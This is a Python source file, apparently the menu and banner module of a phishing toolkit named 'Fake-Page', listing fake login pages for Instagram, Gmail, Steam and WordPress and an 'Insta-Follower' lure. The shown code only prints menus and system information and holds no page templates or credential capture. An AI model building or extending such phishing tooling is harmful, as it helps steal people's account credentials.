from subprocess import Popen
from colorama import Fore
import sys
import os
import time


s = Fore.GREEN+f"""
 _______    ___       __  ___  _______        .______      ___       _______  _______ 
|   ____|  /   \     |  |/  / |   ____|       |   _  \    /   \     /  _____||   ____|
|  |__    /  ^  \    |  '  /  |  |__    ______|  |_)  |  /  ^  \   |  |  __  |  |__   
|   __|  /  /_\  \   |    <   |   __|  |______|   ___/  /  /_\  \  |  | |_ | |   __|  
|  |    /  _____  \  |  .  \  |  |____        |  |     /  _____  \ |  |__| | |  |____ 
|__|   /__/     \__\ |__|\__\ |_______|       | _|    /__/     \__\ \______| |_______|

                      ( Create By = Alisa-Alikhai (Quad) )
                      ( {Fore.LIGHTGREEN_EX}Made{Fore.LIGHTWHITE_EX} in{Fore.LIGHTRED_EX} Iran{Fore.GREEN}                     )
                      ( Versian = 1.2.1                  )  
                      ( Telegram ID : @AL13A_7           )      

                      
"""


# if os.name == "posix":
#     os.system("clear")  
#     print("")
#     Popen("neofetch")
#     time.sleep(2)    
# elif os.name == "nt":
#     os.system("cls")    
#     print("")
#     Popen("neofetch")
#     time.sleep(2)    

def Banner():
    if os.name == "posix":
        os.system("clear") 
        # time.sleep(0.2)    
        print("")
        print(s)
        time.sleep(1.5)    
    elif os.name == "nt":
        os.system("cls") 
        # time.sleep(0.2)   
        print("")
        print(s)
        time.sleep(1.5)   


def list1():
    print(f"{Fore.LIGHTYELLOW_EX}[!]{Fore.LIGHTBLUE_EX} Select options below:\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[01]{Fore.LIGHTRED_EX} Fake Page\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[02]{Fore.LIGHTRED_EX} Show System Info\n")   
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[03]{Fore.LIGHTRED_EX} Developer info\n") 
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[04]{Fore.LIGHTRED_EX} Exit...\n") 
    
def list2():# Fake page
    Banner()
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[!]{Fore.LIGHTBLUE_EX} Select options below:\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[01]{Fore.LIGHTRED_EX} instagram\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[02]{Fore.LIGHTRED_EX} Google Gmail\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[03]{Fore.LIGHTRED_EX} Steam\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[04]{Fore.LIGHTRED_EX} Wordpress\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[05]{Fore.LIGHTRED_EX} Exit...\n")

def list3():#fake page ---> instagram
    Banner()
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[!]{Fore.LIGHTBLUE_EX} Select options below:\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[01]{Fore.LIGHTRED_EX} Orginal instagram\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[02]{Fore.LIGHTRED_EX} Insta-Follower\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTYELLOW_EX}[03]{Fore.LIGHTRED_EX} Exit...\n")

def list4():#developer info
    Banner()
    time.sleep(0.1)
    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTRED_EX}Name:{Fore.LIGHTBLUE_EX} Alisa\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTRED_EX}Family:{Fore.LIGHTBLUE_EX} Alikhani\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTRED_EX}Nickname:{Fore.LIGHTBLUE_EX} Quad\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTRED_EX}telegram:{Fore.LIGHTBLUE_EX} @AL13A_7\n")
    time.sleep(0.1)
    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTRED_EX}Gmail:{Fore.LIGHTBLUE_EX} alisa84alikhani.com@gmail.com\n")

    try:
        input("\nBack To Menu ...")
    except:
        print("")
        print("\n")
        sys.exit()
        
def list5():# system info
    if os.name =="nt":
        Popen("systeminfo")
        time.sleep(5)
        try:
            input(f"\n{Fore.BLUE}Back To Menu ...")
        except:
            print("")
            print("\n")
            sys.exit()
    elif os.name == "posix":
        Popen("neofetch")
        time.sleep(5)
        try:
            input(f"\n{Fore.BLUE}Back To Menu ...")
        except:
            print("")
            print("\n")
            sys.exit()